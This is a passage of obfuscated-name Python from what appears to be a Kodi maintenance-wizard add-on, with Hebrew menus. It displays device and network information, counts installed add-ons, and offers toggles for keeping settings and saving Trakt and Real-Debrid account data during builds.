	OOO0000000O00OOO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2214
	OOO00O00OOO0O0OOO =[];OOO0000OO0OOO0000 =0 #line:2215
	for OOOO000O00O000O0O in OOO0000000O00OOO0 :#line:2216
		OOO0O00O0OO0OOO0O =wiz .getInfo (OOOO000O00O000O0O )#line:2217
		O000O0O00O0O00000 =0 #line:2218
		while OOO0O00O0OO0OOO0O =="Busy"and O000O0O00O0O00000 <10 :#line:2219
			OOO0O00O0OO0OOO0O =wiz .getInfo (OOOO000O00O000O0O );O000O0O00O0O00000 +=1 ;wiz .log ("%s sleep %s"%(OOOO000O00O000O0O ,str (O000O0O00O0O00000 )));xbmc .sleep (1000 )#line:2220
		OOO00O00OOO0O0OOO .append (OOO0O00O0OO0OOO0O )#line:2221
		OOO0000OO0OOO0000 +=1 #line:2222
	O00OOOO00OOOOO000 =OOO00O00OOO0O0OOO [8 ]if 'Una'in OOO00O00OOO0O0OOO [8 ]else wiz .convertSize (int (float (OOO00O00OOO0O0OOO [8 ][:-8 ]))*1024 *1024 )#line:2223
	O0O0O00OOOOOO0000 =OOO00O00OOO0O0OOO [9 ]if 'Una'in OOO00O00OOO0O0OOO [9 ]else wiz .convertSize (int (float (OOO00O00OOO0O0OOO [9 ][:-8 ]))*1024 *1024 )#line:2224
	OOOO0O0OO00OOOO0O =OOO00O00OOO0O0OOO [10 ]if 'Una'in OOO00O00OOO0O0OOO [10 ]else wiz .convertSize (int (float (OOO00O00OOO0O0OOO [10 ][:-8 ]))*1024 *1024 )#line:2225
	OO00O0OOOO00OOO00 =wiz .convertSize (int (float (OOO00O00OOO0O0OOO [11 ][:-2 ]))*1024 *1024 )#line:2226
	OOOO000000O0O0OOO =wiz .convertSize (int (float (OOO00O00OOO0O0OOO [12 ][:-2 ]))*1024 *1024 )#line:2227
	O0OOO0O0OO0000O0O =wiz .convertSize (int (float (OOO00O00OOO0O0OOO [13 ][:-2 ]))*1024 *1024 )#line:2228
	OO0OO000OO00OO0O0 ,O00OOO0OO0O0OOO00 ,OO0O000OO0O0OO0O0 =getIP ()#line:2229
	OOO0O000OO0O0OOO0 =[];O0OOO00O000O00OO0 =[];O0000OO0O00O0000O =[];O0O00000000O00O0O =[];O0O000O0OO000OOO0 =[];OOOOOO000000O0000 =[];O0OO0OOO00000O000 =[]#line:2231
	O0000O0OOOO0O0OO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:2233
	for OOOOO0O0OO000OO00 in sorted (O0000O0OOOO0O0OO0 ,key =lambda OO00000OOOOO00OO0 :OO00000OOOOO00OO0 ):#line:2234
		OOOOO0O00OOO0O0OO =os .path .split (OOOOO0O0OO000OO00 [:-1 ])[1 ]#line:2235
		if OOOOO0O00OOO0O0OO =='packages':continue #line:2236
		O0OOO00000OO0O00O =os .path .join (OOOOO0O0OO000OO00 ,'addon.xml')#line:2237
		if os .path .exists (O0OOO00000OO0O00O ):#line:2238
			O00O0OO00O0000OOO =open (O0OOO00000OO0O00O )#line:2239
			OO00OOO0O00O0O0O0 =O00O0OO00O0000OOO .read ()#line:2240
			O0OOO0OOOOO0000OO =re .compile ("<provides>(.+?)</provides>").findall (OO00OOO0O00O0O0O0 )#line:2241
			if len (O0OOO0OOOOO0000OO )==0 :#line:2242
				if OOOOO0O00OOO0O0OO .startswith ('skin'):O0OO0OOO00000O000 .append (OOOOO0O00OOO0O0OO )#line:2243
				if OOOOO0O00OOO0O0OO .startswith ('repo'):O0O000O0OO000OOO0 .append (OOOOO0O00OOO0O0OO )#line:2244
				else :OOOOOO000000O0000 .append (OOOOO0O00OOO0O0OO )#line:2245
			elif not (O0OOO0OOOOO0000OO [0 ]).find ('executable')==-1 :O0O00000000O00O0O .append (OOOOO0O00OOO0O0OO )#line:2246
			elif not (O0OOO0OOOOO0000OO [0 ]).find ('video')==-1 :O0000OO0O00O0000O .append (OOOOO0O00OOO0O0OO )#line:2247
			elif not (O0OOO0OOOOO0000OO [0 ]).find ('audio')==-1 :O0OOO00O000O00OO0 .append (OOOOO0O00OOO0O0OO )#line:2248
			elif not (O0OOO0OOOOO0000OO [0 ]).find ('image')==-1 :OOO0O000OO0O0OOO0 .append (OOOOO0O00OOO0O0OO )#line:2249
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2251
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0O0OOO [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2252
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0O0OOO [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2253
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform_d ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:2254
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0O0OOO [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2255
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0O0OOO [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:2256
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2258
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0O0OOO [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2259
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0O0OOO [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2260
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2262
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOOO00OOOOO000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2263
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O00OOOOOO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2264
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O0OO00OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2265
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2267
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0OOOO00OOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2268
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO000000O0O0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2269
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O0OO0000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2270
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:2272
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0O0OOO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2273
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO000OO00OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2274
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO0OO0O0OOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2275
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000OO0O0OO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2276
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00O00OOO0O0OOO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2277
	OOOOO00OO0000000O =len (OOO0O000OO0O0OOO0 )+len (O0OOO00O000O00OO0 )+len (O0000OO0O00O0000O )+len (O0O00000000O00O0O )+len (OOOOOO000000O0000 )+len (O0OO0OOO00000O000 )+len (O0O000O0OO000OOO0 )#line:2279
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOOOO00OO0000000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2280
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000OO0O00O0000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2281
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00000000O00O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2282
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOO00O000O00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2283
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0O000OO0O0OOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2284
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O000O0OO000OOO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2285
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0OOO00000O000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2286
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOO000000O0000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:2287
def Menu ():#line:2288
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2289
def saveMenu ():#line:2291
	OOOOOOO0O00O0OOO0 ='[COLOR yellow]מופעל[/COLOR]';O000O00OO00OO0O0O ='[COLOR blue]מבוטל[/COLOR]'#line:2293
	O0O0OOO0OOO0OOO00 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:2294
	O00OOO000O0O0000O ='true'if KEEPMOVIELIST =='true'else 'false'#line:2295
	O00O0OO0O0O0O0000 ='true'if KEEPINFO =='true'else 'false'#line:2296
	OOO00OOOOOOOOO0OO ='true'if KEEPSOUND =='true'else 'false'#line:2298
	OO0OOOO000000O0O0 ='true'if KEEPVIEW =='true'else 'false'#line:2299
	OOOOOO00OOOOO0O00 ='true'if KEEPSKIN =='true'else 'false'#line:2300
	OOOO0O0OO0O00O0OO ='true'if KEEPSKIN2 =='true'else 'false'#line:2301
	O00O0OO00000OO0O0 ='true'if KEEPSKIN3 =='true'else 'false'#line:2302
	OOO00OOO0000O0OOO ='true'if KEEPADDONS =='true'else 'false'#line:2303
	O0O00O000OOO00000 ='true'if KEEPPVR =='true'else 'false'#line:2304
	OOOO0OO0OOOOO0O00 ='true'if KEEPTVLIST =='true'else 'false'#line:2305
	OO0000O00000000O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:2306
	OO000000O0O0OO00O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:2307
	OOO00OOO00OOO0OO0 ='true'if KEEPHUBTV =='true'else 'false'#line:2308
	O000OOO00O00OOOO0 ='true'if KEEPHUBVOD =='true'else 'false'#line:2309
	OOOOO0O0OO000O000 ='true'if KEEPHUBSPORT =='true'else 'false'#line:2310
	OOOO0OOOO0OO00OO0 ='true'if KEEPHUBKIDS =='true'else 'false'#line:2311
	OO0OOOO00OOO0OOO0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:2312
	O00OOO00OO0O000O0 ='true'if KEEPHUBMENU =='true'else 'false'#line:2313
	O0OOOOO0OOO00O00O ='true'if KEEPPLAYLIST =='true'else 'false'#line:2314
	O0000O0OOOOO0O0O0 ='true'if KEEPTRAKT =='true'else 'false'#line:2315
	O0O0000O0OO0O00OO ='true'if KEEPREAL =='true'else 'false'#line:2316
	OOOOO00OOOOO0O000 ='true'if KEEPRD2 =='true'else 'false'#line:2317
	O000OOOO0O0OO0000 ='true'if KEEPTORNET =='true'else 'true'#line:2318
	OOO0000O00OO0OO0O ='true'if KEEPLOGIN =='true'else 'false'#line:2319
	O00O00OOO0O0000O0 ='true'if KEEPSOURCES =='true'else 'false'#line:2320
	OOOOOOO0O0OO0O0O0 ='true'if KEEPADVANCED =='true'else 'false'#line:2321
	OOOOO0000000O0000 ='true'if KEEPPROFILES =='true'else 'false'#line:2322
	OOO00OO00000OOOOO ='true'if KEEPFAVS =='true'else 'false'#line:2323
	OOOOOO000OOO0O00O ='true'if KEEPREPOS =='true'else 'false'#line:2324
	O0O00OOOO0O00O000 ='true'if KEEPSUPER =='true'else 'false'#line:2325
	O0OOOO0OOO0O0OOOO ='true'if KEEPWHITELIST =='true'else 'false'#line:2326
	O0OO00O0OOOO000O0 ='true'if KEEPWEATHER =='true'else 'false'#line:2327
	OOO000OO0O00O0000 ='true'if KEEPVICTORY =='true'else 'false'#line:2328
	OOOO0O0O0O000OO0O ='true'if KEEPTELEMEDIA =='true'else 'false'#line:2329
	if O0OOOO0OOO0O0OOOO =='true':#line:2331
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:2332
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:2333
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:2334
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:2335
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:2336
	addFile ('%s שמירת חשבון RD:  '%O0O0000O0OO0O00OO .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:2339
	addFile ('%s שמירת חשבון טראקט:  '%O0000O0OOOOO0O0O0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:2340
	addFile ('%s שמירת מועדפים:  '%OOO00OO00000OOOOO .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:2343
	addFile ('%s שמירת לקוח טלוויזיה:  '%O0O00O000OOO00000 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:2344
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%OOO000OO0O00O0000 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:2345
	addFile ('%s שמירת חשבון טלמדיה:  '%OOOO0O0O0O000OO0O .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:2346
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OOOO0OO0OOOOO0O00 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:2347
	addFile ('%s שמירת אריח סרטים:  '%OO0000O00000000O0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:2348
	addFile ('%s שמירת אריח סדרות:  '%OO000000O0O0OO00O .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:2349
	addFile ('%s שמירת אריח טלויזיה:  '%OOO00OOO00OOO0OO0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:2350
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O000OOO00O00OOOO0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2351
	addFile ('%s שמירת אריח ספורט:  '%OOOOO0O0OO000O000 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:2352
	addFile ('%s שמירת אריח ילדים:  '%OOOO0OOOO0OO00OO0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:2353
	addFile ('%s שמירת אריח מוסיקה:  '%OO0OOOO00OOO0OOO0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:2354
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O00OOO00OO0O000O0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:2355
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOOOO00OOOOO0O00 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:2356
	addFile ('%s שמירת הגדרות מזג האוויר:  '%O0OO00O0OOOO000O0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:2357
	addFile ('%s שמירת הרחבות שהתקנתי:  '%OOO00OOO0000O0OOO .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:2363
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O00O0OO0O0O0O0000 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:2364
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%O00OOO000O0O0000O .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:2367
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O00O00OOO0O0000O0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:2368
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%OOO00OOOOOOOOO0OO .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:2369
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO0OOOO000000O0O0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:2371
	addFile ('%s שמירת פליליסט לאודר:  '%O0OOOOO0OOO00O00O .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:2372
	addFile ('%s שמירת הגדרות באפר: '%OOOOOOO0O0OO0O0O0 .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:2377
	addFile ('%s שמירת רשימות ריפו:  '%OOOOOO000OOO0O00O .replace ('true',OOOOOOO0O00O0OOO0 ).replace ('false',O000O00OO00OO0O0O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:2379
	setView ('files','viewType')#line:2381
def traktMenu ():#line:2383
	O00O000OOO00O0O0O ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:2384
	O0O000O00OOO0OO00 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:2385
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:2386
	addFile ('Save Trakt Data: %s'%O00O000OOO00O0O0O ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:2387
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0O000O00OOO0OO00 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2388
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:2389
	for O00O000OOO00O0O0O in traktit .ORDER :#line:2391
		OOO000OO0O00OOOOO =TRAKTID [O00O000OOO00O0O0O ]['name']#line:2392
		OO0000OOO0000OO00 =TRAKTID [O00O000OOO00O0O0O ]['path']#line:2393
		O000OOO00O0O0000O =TRAKTID [O00O000OOO00O0O0O ]['saved']#line:2394
		O0O0O00000000O0OO =TRAKTID [O00O000OOO00O0O0O ]['file']#line:2395
		O0OOOOOOOOO0O0000 =wiz .getS (O000OOO00O0O0000O )#line:2396
		OOO0000O0OOOO00O0 =traktit .traktUser (O00O000OOO00O0O0O )#line:2397
		O0O000000OO00000O =TRAKTID [O00O000OOO00O0O0O ]['icon']if os .path .exists (OO0000OOO0000OO00 )else ICONTRAKT #line:2398
		OO0O00O0O0OO0OOOO =TRAKTID [O00O000OOO00O0O0O ]['fanart']if os .path .exists (OO0000OOO0000OO00 )else FANART #line:2399
		OOOOO0O00OO00000O =createMenu ('saveaddon','Trakt',O00O000OOO00O0O0O )#line:2400
		OO0000O00OO0OO000 =createMenu ('save','Trakt',O00O000OOO00O0O0O )#line:2401
		OOOOO0O00OO00000O .append ((THEME2 %'%s Settings'%OOO000OO0O00OOOOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O00O000OOO00O0O0O )))#line:2402
		addFile ('[+]-> %s'%OOO000OO0O00OOOOO ,'',icon =O0O000000OO00000O ,fanart =OO0O00O0O0OO0OOOO ,themeit =THEME3 )#line:2404
		if not os .path .exists (OO0000OOO0000OO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O0O000000OO00000O ,fanart =OO0O00O0O0OO0OOOO ,menu =OOOOO0O00OO00000O )#line:2405
		elif not OOO0000O0OOOO00O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O00O000OOO00O0O0O ,icon =O0O000000OO00000O ,fanart =OO0O00O0O0OO0OOOO ,menu =OOOOO0O00OO00000O )#line:2406
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOO0000O0OOOO00O0 ,'authtrakt',O00O000OOO00O0O0O ,icon =O0O000000OO00000O ,fanart =OO0O00O0O0OO0OOOO ,menu =OOOOO0O00OO00000O )#line:2407
		if O0OOOOOOOOO0O0000 =="":#line:2408
			if os .path .exists (O0O0O00000000O0OO ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O00O000OOO00O0O0O ,icon =O0O000000OO00000O ,fanart =OO0O00O0O0OO0OOOO ,menu =OO0000O00OO0OO000 )#line:2409
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O00O000OOO00O0O0O ,icon =O0O000000OO00000O ,fanart =OO0O00O0O0OO0OOOO ,menu =OO0000O00OO0OO000 )#line:2410
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0OOOOOOOOO0O0000 ,'',icon =O0O000000OO00000O ,fanart =OO0O00O0O0OO0OOOO ,menu =OO0000O00OO0OO000 )#line:2411
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2413
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2414
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2415
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2416
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2417
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:2418
	setView ('files','viewType')#line:2419
def realMenu ():#line:2421
	O0OO0OOO0O0O000OO ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:2422
	OO00O0O0000O0O00O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:2423
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:2424
	addFile ('Save Real Debrid Data: %s'%O0OO0OOO0O0O000OO ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:2425
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (OO00O0O0000O0O00O ),'',icon =ICONREAL ,themeit =THEME3 )#line:2426
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:2427
	for OOO0OO00O0OO0O00O in debridit .ORDER :#line:2429
		O0OO0O00OO00000O0 =DEBRIDID [OOO0OO00O0OO0O00O ]['name']#line:2430
		OOO00O00O0O0OOO0O =DEBRIDID [OOO0OO00O0OO0O00O ]['path']#line:2431
		OOOOO000O0OO0OOOO =DEBRIDID [OOO0OO00O0OO0O00O ]['saved']#line:2432
		OO0OO0OO0O0OO0O0O =DEBRIDID [OOO0OO00O0OO0O00O ]['file']#line:2433
		OO000OO0OOO00OO00 =wiz .getS (OOOOO000O0OO0OOOO )#line:2434
		O0OOOO00O0000O0O0 =debridit .debridUser (OOO0OO00O0OO0O00O )#line:2435
		O00OO0000OO000OOO =DEBRIDID [OOO0OO00O0OO0O00O ]['icon']if os .path .exists (OOO00O00O0O0OOO0O )else ICONREAL #line:2436
		OO000OO00OO00OO00 =DEBRIDID [OOO0OO00O0OO0O00O ]['fanart']if os .path .exists (OOO00O00O0O0OOO0O )else FANART #line:2437
		O0O0O0O00OO0000OO =createMenu ('saveaddon','Debrid',OOO0OO00O0OO0O00O )#line:2438
		OO0OO000OOOOO0000 =createMenu ('save','Debrid',OOO0OO00O0OO0O00O )#line:2439
		O0O0O0O00OO0000OO .append ((THEME2 %'%s Settings'%O0OO0O00OO00000O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO0OO00O0OO0O00O )))#line:2440
		addFile ('[+]-> %s'%O0OO0O00OO00000O0 ,'',icon =O00OO0000OO000OOO ,fanart =OO000OO00OO00OO00 ,themeit =THEME3 )#line:2442
		if not os .path .exists (OOO00O00O0O0OOO0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O00OO0000OO000OOO ,fanart =OO000OO00OO00OO00 ,menu =O0O0O0O00OO0000OO )#line:2443
		elif not O0OOOO00O0000O0O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO0OO00O0OO0O00O ,icon =O00OO0000OO000OOO ,fanart =OO000OO00OO00OO00 ,menu =O0O0O0O00OO0000OO )#line:2444
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0OOOO00O0000O0O0 ,'authdebrid',OOO0OO00O0OO0O00O ,icon =O00OO0000OO000OOO ,fanart =OO000OO00OO00OO00 ,menu =O0O0O0O00OO0000OO )#line:2445
		if OO000OO0OOO00OO00 =="":#line:2446
